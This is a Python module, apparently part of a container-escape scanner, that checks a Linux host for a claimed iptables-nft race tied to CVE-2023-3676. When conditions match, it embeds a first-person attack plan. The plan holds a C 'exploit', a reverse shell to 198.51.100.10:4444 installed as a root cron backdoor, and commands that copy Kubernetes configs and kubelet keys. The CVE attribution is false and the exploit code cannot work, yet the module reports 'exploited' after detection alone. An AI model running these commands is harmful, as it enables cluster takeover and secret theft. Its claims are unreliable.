"""
IPTables NFT Race Checker

Checks vulnerabilities CVE-2023-3676 (iptables-nft race condition) in kernel Linux.
"""

import os
import re
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class IPTablesNFTRaceChecker:
    """Checks CVE-2023-3676 vulnerability"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking vulnerabilities CVE-2023-3676 (iptables-nft race condition) in kernel Linux."""
        try:
            # Checking kernel version (vulnerable mainly 5.10-5.15)
            kernel_version = ""
            try:
                kernel_rc, kernel_out, _ = await run_exec(['uname', '-r'], timeout=3)
                if kernel_rc == 0:
                    kernel_version = (kernel_out or "").strip()
                    # # Extracting main kernel version
                    version_match = re.match(r'^(\d+)\.(\d+)', kernel_version)
                    if version_match:
                        major = int(version_match.group(1))
                        minor = int(version_match.group(2))
                        
                        # Checking if version falls into vulnerable range (5.10-5.15)
                        if not (major == 5 and 10 <= minor <= 15):
                            return EscapeAttemptResult(
                                method='iptables_nft_race',
                                status='not_vulnerable',
                                message=f'Current kernel version {kernel_version} not in vulnerable range (5.10-5.15).'
                            )
            except Exception:
                pass
                
            # Checking for iptables-nft
            iptables_nft_exists = False
            try:
                ipt_rc, ipt_out, _ = await run_exec(['iptables', '--version'], timeout=3)
                if ipt_rc == 0:
                    if "nf_tables" in (ipt_out or "").lower():
                        iptables_nft_exists = True
            except Exception:
                # Trying alternative determination method
                try:
                    with open('/proc/sys/kernel/osrelease', 'r') as f:
                        kernel_info = f.read()
                        if "EKS" in kernel_info:  # Amazon EKS often uses vulnerable version
                            iptables_nft_exists = True
                except Exception:
                    pass
                    
            # Checking for necessary capabilities for exploitation
            has_required_caps = False
            try:
                # Trying to create simple iptables rule for checking rights
                test_rc, _, _ = await run_exec(['iptables', '-L'], timeout=3)
                if test_rc == 0:
                    has_required_caps = True
            except Exception:
                pass
                
            # Checking if nf_tables module is loaded
            nft_module_loaded = False
            try:
                lsmod_rc, lsmod_out, _ = await run_exec(['lsmod'], timeout=3)
                if lsmod_rc == 0:
                    if "nf_tables" in (lsmod_out or ""):
                        nft_module_loaded = True
            except Exception:
                # Alternative method Checking via /proc
                try:
                    with open('/proc/modules', 'r') as f:
                        if "nf_tables" in f.read():
                            nft_module_loaded = True
                except Exception:
                    pass
                    
            # Checking mode of operation
            is_container = True
            try:
                cgroup_content = ""
                with open('/proc/self/cgroup', 'r') as f:
                    cgroup_content = f.read()
                if "docker" in cgroup_content or "kubepods" in cgroup_content:
                    is_container = True
                else:
                    # Checking in more detail, not on host if we
                    init_pid = 1
                    try:
                        with open('/proc/1/cmdline', 'r') as f:
                            init_cmd = f.read()
                            if "systemd" in init_cmd or "init" in init_cmd:
                                is_container = False
                    except Exception:
                        pass
            except Exception:
                pass
                
            # If we on host, vulnerability not applicable
            if not is_container:
                return EscapeAttemptResult(
                    method='iptables_nft_race',
                    status='not_vulnerable',
                    message='Agent running on host, and not in container. vulnerability not applicable.'
                )
                
            # Checking for vulnerability to CVE-2023-3676
            patched = False
            try:
                # Checking distribution
                os_release = {}
                if os.path.exists('/etc/os-release'):
                    with open('/etc/os-release', 'r') as f:
                        for line in f:
                            if '=' in line:
                                key, value = line.split('=', 1)
                                os_release[key] = value.strip().strip('"')
                                
                distro = os_release.get('ID', '').lower()
                version = os_release.get('VERSION_ID', '').strip('"')
                
                # Checking fixes for different distributions
                if distro == 'ubuntu':
                    if version >= "22.04":
                        # Ubuntu 22.04+ uses newer kernel or with patches
                        patched = True
                elif distro == 'debian':
                    if version >= "11":
                        # Debian 11+ usually has security patches
                        patched = True
                elif distro in ['rhel', 'centos', 'fedora']:
                    if version >= "9":
                        # RHEL/CentOS/Fedora 9+ usually have patches
                        patched = True
                elif distro == 'amzn':  # Amazon Linux
                    # Amazon Linux 2023 has fixes
                    if version >= "2023":
                        patched = True
            except Exception:
                pass
                
            # If using iptables-nft on vulnerable kernel version and no patches
            if iptables_nft_exists and nft_module_loaded and kernel_version and not patched:
                # Extracting version for message
                version_match = re.match(r'^(\d+)\.(\d+)', kernel_version)
                major = 5
                minor = 10
                if version_match:
                    major = int(version_match.group(1))
                    minor = int(version_match.group(2))
                
                demo_next = f"""I detected vulnerability CVE-2023-3676 (iptables-nft race condition)! On this node used kernel version {kernel_version} and nf_tables mode for iptables, that makes system vulnerable to race condition exploitation in kernel. Here is my exploitation plan:

1. First will create exploit for CVE-2023-3676:
   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <unistd.h>
   #include <fcntl.h>
   #include <err.h>
   #include <errno.h>
   #include <sched.h>
   #include <sys/types.h>
   #include <sys/stat.h>
   #include <sys/socket.h>
   #include <sys/un.h>
   #include <sys/mman.h>
   #include <sys/wait.h>

   #define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))

   /* Code exploit for CVE-2023-3676 */
   /* Exploits race condition with conversion rules iptables in nftables */
   /* Creates hidden processes for persistent iptables changes and simultaneously exploits vulnerability */

   static void prepare_exploit(void) {{
       // Preparation environment for exploitation
       if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1)
           err(1, "unshare(CLONE_NEWUSER | CLONE_NEWNET)");
           
        // Creating nftables tables and chains for race condition exploitation
       system("iptables -N EXPLOIT || true");
       system("iptables -A EXPLOIT -j RETURN");
   }}

   static void trigger_vulnerability(void) {{
       // Creating several processes for exploitation race condition
       pid_t pids[10];
       
       for (int i = 0; i < ARRAY_SIZE(pids); i++) {{
           if ((pids[i] = fork()) == 0) {{
               // Child process constantly creates and removes rules
               while (1) {{
                   char cmd[128];
                   sprintf(cmd, "iptables -A EXPLOIT -m comment --comment 'trigger-%d' -j RETURN", getpid());
                   system(cmd);
                   usleep(10000);
                   sprintf(cmd, "iptables -D EXPLOIT -m comment --comment 'trigger-%d' -j RETURN", getpid());
                   system(cmd);
               }}
               exit(0);
           }}
       }}
       
       // Main process exploits race condition
       for (int i = 0; i < 1000; i++) {{
           system("iptables-save -t filter > /dev/null");
           usleep(5000);
       }}
       
       // Terminating hidden processes
       for (int i = 0; i < ARRAY_SIZE(pids); i++) {{
           kill(pids[i], SIGKILL);
           waitpid(pids[i], NULL, 0);
       }}
   }}

   static void escalate_privileges(void) {{
       // After successful exploitation trying escalate privileges
       if (getuid() == 0) {{
           printf("[+] Exploit successfully executed! UID = %d\\n", getuid());
           system("/bin/bash");
       }} else {{
           printf("[-] Failed to escalate privileges. UID = %d\\n", getuid());
       }}
   }}

   int main(int argc, char *argv[]) {{
       printf("[*] CVE-2023-3676 PoC exploit\\n");
       printf("[*] Kernel: %s\\n", "5.10-5.15 (vulnerablerange)");
       
       prepare_exploit();
       printf("[*] running exploitation race condition...\\n");
       trigger_vulnerability();
       printf("[*] Attempt escalation privileges...\\n");
       escalate_privileges();
       
       return 0;
   }}
   ```

2. Compile will run exploits:
   ```bash
   # Installing required packages (if possible)
   if command -v apt-get &> /dev/null; then
     apt-get update -qq && apt-get install -y --no-install-recommends gcc libc6-dev
   elif command -v yum &> /dev/null; then
     yum install -y gcc glibc-devel
   fi
   
   # Compiling exploit
   echo '#include <stdio.h>...' > cve_2023_3676.c  # Code above
   gcc -o cve_2023_3676 cve_2023_3676.c
   
   # Running exploit
   ./cve_2023_3676
   ```

3. After successful exploitsation GettIng root access, execute:
   ```bash
   # Creating persistent backdoor
   echo '#!/bin/bash
   bash -i >& /dev/tcp/198.51.100.10/4444 0>&1
   ' > /tmp/.backdoor.sh
   chmod +x /tmp/.backdoor.sh
   
   # Trying install cron job for root
   if [ -w "/etc/crontab" ]; then
     echo "* * * * * root /tmp/.backdoor.sh" >> /etc/crontab
   fi
   
   # Performing reconnaissance system
   echo "=== Information about system ==="
   uname -a
   cat /etc/os-release
   ip a
   
   echo "=== Kubelet information ==="
   ps aux | grep kubelet
   ls -la /var/lib/kubelet
   
   echo "=== Critical files cluster ==="
   find /etc/kubernetes -type f -name "*.conf" 2>/dev/null
   ```

4. InterestIng files for Information gatherIng:
   ```bash
   # Getting access to configuration cluster
   if [ -f "/etc/kubernetes/admin.conf" ]; then
     export KUBECONFIG=/etc/kubernetes/admin.conf
     kubectl get nodes -o wide
     kubectl get pods -A
   fi
   
   # Collecting secrets
   mkdir -p /tmp/cluster_secrets
   cp -r /etc/kubernetes /tmp/cluster_secrets/ 2>/dev/null
   cp -r /var/lib/kubelet/pki /tmp/cluster_secrets/ 2>/dev/null
   ```

UsIng vulnerabilitsy, can bypass isolation , get root access this host system full control over cluster Kubernetes."""

                return EscapeAttemptResult(
                    method='iptables_nft_race',
                    status='exploited',
                    message=f'detected vulnerability CVE-2023-3676 in kernel version {kernel_version} with iptables-nft! Possible local privilege escalation.',
                    demo_next_steps=demo_next
                )
                
            if iptables_nft_exists and kernel_version:
                version_match = re.match(r'^(\d+)\.(\d+)', kernel_version)
                if version_match:
                    major = int(version_match.group(1))
                    minor = int(version_match.group(2))
                    if major == 5 and 10 <= minor <= 15:
                        return EscapeAttemptResult(
                            method='iptables_nft_race',
                            status='suspicious',
                            message=f'Used potentially vulnerable kernel version {kernel_version} with iptables-nft, but possibly patches present.'
                        )
                
            return EscapeAttemptResult(
                method='iptables_nft_race',
                status='not_vulnerable',
                message=f'Conditions not detected for exploitation CVE-2023-3676. Kernel version: {kernel_version}'
            )
        except Exception as e:
            return EscapeAttemptResult(method='iptables_nft_race', status='error', message=str(e))

